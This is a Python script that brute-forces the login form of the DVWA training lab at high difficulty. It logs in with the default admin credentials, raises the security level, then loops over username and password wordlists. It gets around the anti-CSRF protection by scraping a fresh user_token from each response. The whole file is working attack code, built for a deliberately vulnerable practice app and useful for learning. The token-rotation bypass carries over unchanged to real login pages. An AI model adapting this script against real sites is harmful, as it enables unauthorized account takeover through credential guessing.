#!/usr/bin/python
# For DVWA bruteforce lab - high difficulty - CSRF tokens doubling up as brute force protection tokens

import requests
import argparse
import logging
import sys
import re

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def get_response(session, url):
    try:
        response = session.get(url, proxies=proxies)
        response.raise_for_status()
        return get_token(response)
    except requests.RequestException as e:
        logging.error(f"Error in retrieving {url}: {str(e)}")
        return None

def get_token(response):
    try:
        match = re.search(r'<input type=\'hidden\' name=\'user_token\' value=\'(.*?)\' />', response.text)
        if match:
            user_token = match.group(1)
            logging.debug('User Token:' + user_token)
            return user_token
        else:
            logging.warning("user_token not found in the response")
            return None
    except Exception as e:
        logging.error(f"Error in processing token: {str(e)}")
        return None

def login(session, url, user_token):
    try:
        payload = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': user_token
        }
        response = session.post(url, data=payload, proxies=proxies)
        response.raise_for_status()
        if 'index' in response.url:
            logging.info("Logged in successfully")
    except requests.RequestException as e:
        logging.error(f"Error in login request: {str(e)}")

def set_security(session, url, user_token):
    try:
        payload = {
            'security': 'high',
            'seclev_submit': 'Submit',
            'user_token': user_token
        }
        response = session.post(url, data=payload, proxies=proxies)
        response.raise_for_status()
        if '<em>high' in response.text:
            logging.info("Security level set to high")
    except requests.RequestException as e:
        logging.error(f"Error in security request: {str(e)}")

def brute(username, password, user_token, session, url):
    try:
        params = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }
        response = session.get(url, params=params, proxies=proxies)
        response.raise_for_status()
        if 'incorrect' in response.text:
            logging.debug(f"{username}:{password} Wrong Credentials")
            user_token = get_token(response)
            return user_token
        else:
            logging.info(f"Found valid credentials- {GREEN}{username}:{password}{RESET}")
            return None
    except requests.RequestException as e:
        logging.error(f"Error in brute request: {str(e)}")
        return None

def main():
    parser = argparse.ArgumentParser(description='DVWA Bruteforce Script')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--username', help='Single username for the bruteforce attack')
    group.add_argument('-U', '--usernames-file', help='Path to the username wordlist file')
    parser.add_argument('-P', '--passwords', required=True, help='Path to the password wordlist file')
    parser.add_argument('-b', '--base-url', default='http://localhost/DVWA/', help='Base URL for the DVWA instance. Example: http://192.168.1.137/dvwa/')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity level to DEBUG')
    args = parser.parse_args()

    password_wordlist_file = args.passwords
    base_url = args.base_url
    session = requests.session()

    # Configure logging level and format
    logging_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=logging_level, format='[%(levelname)s] %(message)s')

    if args.username:
        usernames = [args.username]
    elif args.usernames_file:
        try:
            with open(args.usernames_file, 'r') as file:
                usernames = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            logging.error(f"Usernames file not found: {args.usernames_file}")
            sys.exit(1)

    if not usernames:
        logging.error("No usernames provided")
        sys.exit(1)

    user_token = get_response(session, base_url + 'login.php')
    if user_token:
        login(session, base_url + 'login.php', user_token)

    user_token = get_response(session, base_url + 'security.php')
    if user_token:
        set_security(session, base_url + 'security.php',user_token)
        
    found_credentials = False  # Flag to track if valid credentials were found
    for username in usernames:
        user_token = get_response(session, base_url + 'vulnerabilities/brute/')
        if user_token:
            with open(password_wordlist_file, 'r') as passwords:
                for password in passwords:
                    user_token = brute(username, password.strip(), user_token, session, base_url + 'vulnerabilities/brute/')
                    if user_token is None:
                        found_credentials = True
                        break
            if not found_credentials:
                logging.info(f"Username: {RED}{username}{RESET} - No valid credentials could be found")
if __name__ == '__main__':
    main()
